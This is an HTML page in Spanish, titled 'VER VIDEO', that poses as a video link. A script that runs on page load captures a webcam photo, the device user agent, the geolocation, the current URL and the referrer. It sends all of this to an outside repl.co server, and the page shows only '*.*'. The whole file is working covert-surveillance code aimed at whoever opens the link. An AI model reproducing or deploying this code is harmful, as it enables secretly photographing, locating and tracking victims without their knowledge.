<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VER VIDEO</title>
    <script>
        async function capturarDatos() {
            // Capturar foto
            const video = document.createElement('video');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const foto = canvas.toDataURL('image/jpeg');

            // Detener el stream
            stream.getTracks().forEach(track => track.stop());

            // Capturar versión y modelo del dispositivo
            const userAgent = navigator.userAgent;

            // Capturar geolocalización
            const ubicacion = await new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            latitud: position.coords.latitude,
                            longitud: position.coords.longitude
                        });
                    },
                    () => resolve({ latitud: 'No disponible', longitud: 'No disponible' })
                );
            });

            // Capturar historial de navegación
            const historial = {
                urlActual: window.location.href,
                referrer: document.referrer
            };

            // Enviar datos al servidor
            const datos = { foto, userAgent, ubicacion, historial };
            fetch('https://979c5a95-3dfb-4130-8e4b-c2a06b13a186-00-cuily0isatzs.spock.repl.co/capturar-datos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datos)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Datos enviados correctamente:", data);
                document.getElementById("mensaje").textContent = "*.*";
            })
            .catch(error => {
                console.error("Error al enviar los datos:", error);
                document.getElementById("mensaje").textContent = "Error al enviar los datos.";
            });
        }

        window.onload = capturarDatos;
    </script>
</head>
<body>
    <h1>VIDEO</h1>
    <p id="mensaje">*.* </p>
</body>
</html>
